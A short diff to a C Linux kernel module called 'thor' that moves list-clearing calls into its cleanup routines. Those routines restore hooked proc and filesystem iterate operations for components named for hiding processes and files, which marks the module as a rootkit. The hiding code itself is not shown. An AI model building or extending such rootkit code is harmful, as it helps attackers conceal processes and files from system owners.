@@ -352,8 +352,6 @@ static void __exit thor_cleanup(void)
     prochidder_cleanup();
     filehidder_cleanup();
 
-    clear_pid_list();
-
     LOG_INFO("cleanup done");
 }
 
@@ -373,6 +371,8 @@ static void prochidder_cleanup(void)
         proc_fops->iterate = orig_proc_iterate;
         set_addr_ro(proc_fops);
     }
+
+    clear_pid_list();
 }
 
 static void filehidder_cleanup(void)
@@ -383,6 +383,8 @@ static void filehidder_cleanup(void)
         fs_fops->iterate = orig_fs_iterate;
         set_addr_ro(fs_fops);
     }
+
+    clear_file_list();
 }
 
 module_init(thor_init);
